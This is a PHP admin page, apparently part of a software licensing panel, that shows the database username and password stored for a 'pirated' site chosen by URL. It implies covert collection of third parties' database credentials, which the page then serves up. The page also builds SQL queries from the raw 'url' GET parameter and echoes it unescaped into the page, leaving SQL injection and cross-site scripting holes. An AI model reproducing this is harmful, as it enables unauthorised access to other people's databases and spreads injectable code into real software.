<?php
/**
 * 获取密码
**/
$mod='blank';
include("../api.inc.php");
$title='盗版站点信息';
include './head.php';
if($islogin==1){}else exit("<script language='javascript'>window.location.href='./login.php';</script>");
?>
<div class="col-lg-8 col-md-12 col-lg-offset-2 text-center">
<div class="panel panel-info" >
<?php
if($udata['per_sq']==0) {
	showmsg('您的账号没有权限使用此功能',3);
	exit;
}

$url = $_GET['url'];

$row=$DB->get_row("SELECT * FROM auth_site WHERE url='$url' limit 1");
if($row['active'] != 1){}else exit("<script language='javascript'>alert('此站点位于正版列表内！');history.go(-1);</script>");

$db=$DB->get_row("SELECT * FROM auth_block WHERE url='$url' limit 1");
?>
<div class="panel-heading font-bold">获取密码</div>
<div class="panel-body">
          <ul class="list-group">
            <li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>站点网址：</b> <?=$url?></a></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-user"></span> <b>数据库账号：</b> <?=$db['name']?></li>
              <li class="list-group-item"><span class="glyphicon glyphicon-lock"></span> <b>数据库密码：</b> <?=$db['pwd']?></li>
              <li class="list-group-item"><span class="glyphicon glyphicon-time"></span> <b>入库时间：</b> <?=$db['date']?></li>
          </ul>
      </div>
<?php include './foot.php';?>